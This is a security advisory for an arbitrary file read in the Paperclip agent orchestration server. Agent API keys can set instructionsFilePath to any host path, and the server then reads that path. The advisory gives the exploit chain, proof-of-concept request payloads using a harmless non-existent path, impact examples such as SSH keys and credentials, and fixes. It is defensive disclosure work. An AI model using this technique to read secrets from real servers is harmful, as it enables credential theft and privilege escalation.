# [M] Paperclip: Arbitrary File Read via Agent-Controlled adapterConfig.instructionsFilePath

## Summary
Severity: Medium
Advisory: GHSA-3pw3-v88x-xj24
CWE: CWE-73
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-3pw3-v88x-xj24
Type: github-advisory

## Affected
- npm: `@paperclipai/shared` — affected >=0 <2026.416.0

## Details
### Summary
Paperclip contains an arbitrary file read vulnerability that allows an attacker with an Agent API key to read files from the Paperclip server host filesystem.
The vulnerability occurs because agents are allowed to modify their own adapterConfig through the /agents/:id API endpoint.
The configuration field adapterConfig.instructionsFilePath is later read directly by the server runtime using fs.readFile().
Because no validation or path restriction is applied, an attacker can supply an arbitrary filesystem path.
The Paperclip server then attempts to read that path from the host filesystem during agent execution.
This breaks the intended trust boundary between agent runtime configuration and server host filesystem access, allowing a compromised or malicious agent to access sensitive files on the host system.

### Details
#### Root Cause
No path normalization, allowlist, or workspace boundary validation is applied before the filesystem read occurs.
Agent configuration can be modified through the API endpoint:
```
PATCH /api/agents/:id
```
The validation schema allows arbitrary configuration fields inside adapterConfig.
File:
```
packages/shared/src/validators/agent.ts
```
Schema fragment:
```
adapterConfig: z.record(z.unknown())
```
Because of this schema, attackers can inject arbitrary configuration values, including:
```
adapterConfig.instructionsFilePath
```
During agent execution, the server runtime reads this path directly from the host filesystem using fs.readFile().
Relevant code path:
```
packages/adapters/claude-local/src/server/execute.ts
```
Execution flow:
```
adapterConfig.instructionsFilePath
        ↓
execute()
        ↓
fs.readFile(instructionsFilePath)
        ↓
file content loaded into runtime
```
Vulnerable logic:
```
const instructionsContent = await fs.readFile(instructionsFilePath, "utf-8");
```
Because the value originates from attacker-controlled configuration and no validation or sandboxing is applied, this becomes a direct host filesystem read primitive.

#### Affected Files
Primary vulnerable file:
```
packages/adapters/claude-local/src/server/execute.ts
```
Relevant function:
```
execute()
```
Sensitive operation:
```
fs.readFile(instructionsFilePath)
```
Configuration source:
```
PATCH /api/agents/:id
```
Validation logic:
```
packages/shared/src/validators/agent.ts
```

#### Attacker Model
Required privileges
Attacker requires:
```
Agent API key
```
Agent credentials are intended for automation and integration with external runtimes.
These credentials are commonly used by:
```
agent runtime environments
third-party integrations
automation pipelines
```
Agent credentials are not intended to grant direct access to the server host filesystem.
No board or administrator privileges are required.

#### Attacker Chain
Complete exploit chain:
```
Attacker obtains Agent API key
        ↓
PATCH /api/agents/:id
        ↓
Inject adapterConfig.instructionsFilePath
        ↓
POST /api/agents/:id/wakeup
        ↓
Server executes agent run
        ↓
execute.ts
        ↓
fs.readFile(attacker_path)
        ↓
Server reads host filesystem path
```
This allows an attacker to read arbitrary files accessible to the Paperclip server process.

#### Trust Boundary Violation
Paperclip’s architecture assumes the following separation:
```
Agent runtime
        ↓
Paperclip orchestration layer
        ↓
Server host filesystem

Agents should only interact with repositories and workflows through the orchestration layer.

However, because agent-controlled configuration is passed directly into fs.readFile, the boundary collapses:

Agent configuration
        ↓
Server filesystem access
```
This allows an agent to access files outside its intended permission scope.

#### Why This Is a Vulnerability (Not Expected Behavior)
The instructionsFilePath configuration appears intended for trusted operators configuring agent runtime behavior.
However, the current API design allows agents themselves to modify this configuration through the agent API.
Because agent credentials may be exposed to external systems or runtime environments, allowing them to control server filesystem paths introduces a security vulnerability.
Therefore:
```
Operator-controlled configuration → expected feature
Agent-controlled configuration → arbitrary file read vulnerability
```
The issue arises from insufficient separation between configuration authority and filesystem access authority.

### PoC
The following PoC demonstrates that the server attempts to read an attacker-controlled filesystem path.
To avoid accessing sensitive data, the PoC uses a non-existent path.
#### Step 1 — Setup Environment
Run server:
```
$env:SHELL = "C:\Program Files\Git\bin\sh.exe"
npx paperclipai onboard --yes
```
Login Claude:
```
claude
/login
```
#### Step 2 — Obtain Agent API key
Create an agent via the UI or CLI and obtain its API key.
Example:
<img width="1475" height="710" alt="image" src="https://github.com/user-attachments/assets/fcc0dfe9-1271-4eed-af0a-7dd83dfa9ad4" />

#### Step 3 — Identify agent ID
```
GET /api/agents/me
```
<img width="824" height="196" alt="image" src="https://github.com/user-attachments/assets/af4a16bb-9bff-485d-af23-4a85d31486fc" />

#### Step 4 — Inject malicious configuration
```
PATCH /api/agents/{agentId}
```
Payload example:
```powershell
{
  "adapterConfig": {
    "instructionsFilePath": "C:\\definitely-does-not-exist-paperclip-poc.txt"
  }
}
```
Example PowerShell payload:
```powershell
$patchBody = @{
  adapterConfig = @{
    instructionsFilePath = "C:\definitely-does-not-exist-paperclip-poc.txt"
  }
} | ConvertTo-Json -Depth 10
```
<img width="1891" height="963" alt="image" src="https://github.com/user-attachments/assets/1a8c41b4-c053-4498-8bf5-ce41c7dfa1b5" />

Step 5 — Trigger execution
```
POST /api/agents/{agentId}/wakeup
```
<img width="927" height="376" alt="image" src="https://github.com/user-attachments/assets/d6107b64-1b5e-493c-9a66-45a4713260b5" />

#### Step 6 — Observe server log
Server log shows:
```
ENOENT: no such file or directory, open 'C:\definitely-does-not-exist-paperclip-poc.txt'
    at async Object.readFile
    at async Object.execute (.../adapter-claude-local/dist/server/execute.js)
```
This confirms the server attempted to read an attacker-controlled filesystem path.
<img width="1916" height="166" alt="image" src="https://github.com/user-attachments/assets/2470438a-bf5a-4f6f-848c-b134d3f0cc3f" />

### Impact
Successful exploitation allows attackers to read sensitive files accessible to the Paperclip server process.
Examples of potentially exposed data include:
```
environment configuration (.env)
SSH private keys
database credentials
API tokens
CI secrets
```
Possible attacker actions:
```
exfiltrate secrets
access private repositories
steal infrastructure credentials
pivot into connected services
```
Because Paperclip orchestrates repositories, agents, and automation tasks, disclosure of such secrets may lead to compromise of the broader deployment environment.

### Recommended Fix
#### Restrict configuration authority
Agents should not be allowed to modify filesystem-sensitive configuration fields.
Example mitigation:
```
adapterConfig.instructionsFilePath
```
should only be configurable by board/admin actors.

#### Path validation
Restrict file access to a safe directory such as:
```
workspace/
agent-config/
```
Reject:
```
absolute paths
system directories
paths containing ".."
```

#### Avoid direct filesystem reads from configuration
Instead of:
```
fs.readFile(user_supplied_path)
```
use:
```
readFile(workspaceSafePath)
```
Example guard
```ts
if (
  request.auth?.principal === "agent" &&
  body?.adapterConfig?.instructionsFilePath
) {
  throw new Error(
    "Agents are not permitted to configure instructionsFilePath"
  );
}
```

### Security Impact Statement
An authenticated attacker with an Agent API key can modify their agent configuration to inject an arbitrary filesystem path into adapterConfig.instructionsFilePath.
The Paperclip server reads this path during agent execution via fs.readFile, allowing the attacker to access files on the server host filesystem.

### Disclosure
This vulnerability was discovered during security research on the Paperclip orchestration runtime and is reported privately to allow maintainers to patch the issue before public disclosure.

## References
- https://github.com/paperclipai/paperclip/security/advisories/GHSA-3pw3-v88x-xj24
- https://github.com/paperclipai/paperclip
